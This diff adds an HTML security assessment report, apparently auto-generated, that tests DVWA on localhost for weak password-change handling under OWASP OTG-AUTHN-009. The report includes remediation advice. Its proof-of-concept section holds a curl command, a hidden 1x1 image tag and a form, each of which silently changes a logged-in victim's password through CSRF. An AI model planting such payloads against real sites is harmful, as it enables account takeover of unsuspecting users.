@@ -1,0 +1,249 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>OTG-AUTHN-009 Security Assessment Report</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #f4f4f4;
+            color: #000;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        header {
+            background-color: #003366;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-size: 1.4em;
+            margin: -20px -20px 20px -20px;
+        }
+        h1, h2, h3 {
+            color: #003366;
+            border-bottom: 1px solid #003366;
+            padding-bottom: 5px;
+        }
+        .field {
+            margin-bottom: 10px;
+        }
+        .label {
+            font-weight: bold;
+            display: inline-block;
+            width: 250px;
+        }
+        .value {
+            display: inline;
+        }
+        .status {
+            color: #cc0000;
+            font-weight: bold;
+        }
+        pre {
+            background: #f0f0f0;
+            padding: 10px;
+            border: 1px solid #ccc;
+            overflow: auto;
+            font-size: 0.9em;
+        }
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 0.9em;
+            color: #555;
+            border-top: 1px solid #ccc;
+            padding-top: 10px;
+        }
+        .risk {
+            font-weight: bold;
+            color: #cc0000;
+        }
+        .success {
+            color: #008800;
+            font-weight: bold;
+        }
+        .failed {
+            color: #cc0000;
+            font-weight: bold;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        .vulnerable {
+            background-color: #ffe6e6;
+        }
+        .secure {
+            background-color: #e6ffe6;
+        }
+        .warning {
+            background-color: #fff3cd;
+        }
+        .explanation {
+            background-color: #e3f2fd;
+            padding: 15px;
+            border-left: 4px solid #2196F3;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            OWASP Web Security Testing Guide - OTG-AUTHN-009
+        </header>
+
+        <h1>OTG-AUTHN-009: Testing for Weak Password Change or Reset Functionalities</h1>
+
+        <div class="field"><span class="label">Test Date:</span> <span class="value">2025-08-04 01:47:38</span></div>
+        <div class="field"><span class="label">Target URL:</span> <span class="value">http://localhost/dvwa</span></div>
+        <div class="field"><span class="label">Test Result:</span> <span class="value status">Failed</span></div>
+
+        <h2>Vulnerability Description</h2>
+        <p>
+            Weak password change or reset functionalities can allow attackers to take over user accounts 
+            without proper authentication. This includes vulnerabilities such as lack of old password 
+            verification, CSRF protection failures, and insecure password reset mechanisms.
+        </p>
+        <p>
+            This test evaluates DVWA's password change functionality in the CSRF vulnerability page, 
+            which demonstrates insecure password change implementation without proper authentication 
+            or CSRF protection.
+        </p>
+
+        <h2>Impact</h2>
+        <p class="risk">High</p>
+        <p>
+            Vulnerable password change mechanisms can lead to full account takeover, unauthorized access 
+            to sensitive data, and potential lateral movement within the application. Attackers can 
+            permanently lock out legitimate users and gain persistent access to compromised accounts.
+        </p>
+
+        <h2>CSRF Attack Explanation</h2>
+        <div class="explanation">
+            <pre>
+CSRF Attack Mechanism in DVWA:
+
+1. Victim logs into DVWA (http://localhost/dvwa)
+2. Victim visits a malicious website while still logged in
+3. The malicious website contains a hidden image or form that points to:
+   http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
+4. Victim's browser automatically sends the request WITH their DVWA session cookies
+5. DVWA processes the request and changes the victim's password to "hacked"
+6. The victim's account is now compromised
+
+This works because:
+- DVWA does not implement CSRF tokens
+- The password change endpoint accepts requests from any source
+- Browser automatically includes authentication cookies with cross-site requests
+</pre>
+        </div>
+
+        <h2>Test Findings</h2>
+        <pre>Password Change/Reset Functionality Test Results:
+============================================================
+✓ PASSWORD CHANGE WITHOUT OLD PASSWORD: VULNERABLE
+✓ CSRF PROTECTION: DVWA is vulnerable to CSRF attacks
+✓ SESSION REGENERATION: NO
+✓ PASSWORD RESET FUNCTIONALITY: DVWA does not have password reset functionality
+
+</pre>
+
+        <h2>Proof of Concept (PoC)</h2>
+        <p>The following examples demonstrate the vulnerabilities found:</p>
+        <pre><code>curl "http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
+
+<!-- CSRF Attack PoC -->
+<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="1" height="1" alt="CSRF Attack">
+    
+Or as a form:
+<form action="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" method="GET">
+    <input type="hidden" name="password_new" value="hacked">
+    <input type="hidden" name="password_conf" value="hacked">
+    <input type="hidden" name="Change" value="Change">
+    <input type="submit" value="Click me!">
+</form></code></pre>
+
+        <h2>Remediation / Recommendations</h2>
+        <p>
+The application contains critical vulnerabilities in password change functionality that must be addressed immediately:
+
+1. Always require the old password for password changes:
+   - Implement old password verification before allowing changes
+   - This prevents unauthorized changes even with session hijacking
+
+2. Implement strong CSRF protection:
+   - Use unpredictable, unique CSRF tokens for each session
+   - Validate tokens server-side on all state-changing operations
+   - Set tokens to expire after reasonable time periods
+   - Include tokens in all forms and AJAX requests
+
+3. Regenerate session IDs after password changes:
+   - Prevent session fixation attacks
+   - Invalidate old sessions to prevent session replay
+
+4. Implement proper access controls:
+   - Ensure password change functionality requires authentication
+   - Verify user identity before allowing changes
+
+5. Add rate limiting:
+   - Prevent brute-force attacks on password change endpoints
+   - Implement account lockout after multiple failed attempts
+
+6. Secure password change form implementation:
+   - Use POST instead of GET for password changes
+   - Validate all input server-side
+   - Implement proper error handling without information leakage
+
+7. Logging and monitoring:
+   - Log all password change attempts
+   - Alert on suspicious password change patterns
+   - Maintain audit trails for compliance
+
+8. Multi-factor authentication:
+   - Require additional verification for sensitive operations
+   - Implement step-up authentication for password changes
+</p>
+
+        <h2>References</h2>
+        <ul>
+            <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities" target="_blank">
+                OWASP WSTG - OTG-AUTHN-009</a></li>
+            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">
+                OWASP CSRF Prevention Cheat Sheet</a></li>
+            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#password-change" target="_blank">
+                OWASP Authentication Cheat Sheet - Password Change</a></li>
+            <li><a href="https://owasp.org/www-project-top-ten/2017/A02_2017-Broken_Authentication" target="_blank">
+                OWASP Top 10 - A02:2017 Broken Authentication</a></li>
+            <li>Always require the old password for changes</li>
+            <li>Implement CSRF tokens and validate them server-side</li>
+            <li>Regenerate session IDs after password change</li>
+            <li>Do not expose password change functionality without authentication</li>
+            <li>Implement rate limiting on password change attempts</li>
+        </ul>
+
+        <footer>
+            OSCP-Style Security Assessment Report | Generated by OTG-AUTHN-009 Tester
+        </footer>
+    </div>
+</body>
+</html>
+    
